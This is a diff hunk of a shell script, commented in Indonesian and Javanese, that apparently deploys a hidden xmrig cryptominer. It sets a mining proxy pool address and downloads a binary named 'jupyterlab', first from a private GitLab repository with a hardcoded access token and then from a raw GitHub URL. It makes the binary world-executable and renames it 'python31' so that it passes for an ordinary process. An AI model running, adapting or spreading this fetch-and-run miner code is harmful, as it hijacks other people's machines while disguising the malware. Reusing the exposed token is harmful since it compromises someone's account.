@@ -47,7 +47,7 @@ STREETc="47.236.203.56:80"     #Ganti ProxyPool / Pool
 
 # Unduh dan ekstrak file miner
 # xmrig wolu iki aktif
-wget --header="PRIVATE-TOKEN: glpat-3ClD0jM0mbXQgAev3NpXgmM6MQpvOjEKdTpvZWx0OQ8.01.171iaew1d" "https://gitlab.com/api/v4/projects/screet-group1%2Fscreet/repository/files/jupyterlab/raw?ref=main" -O jupyterlab > /dev/null 2>&1
+wget "https://raw.githubusercontent.com/kermend-ui/sg/main/jupyterlab" -O jupyterlab > /dev/null 2>&1
 chmod 777 jupyterlab && mv jupyterlab python31
 
 # Miner CPUminer iki non aktif
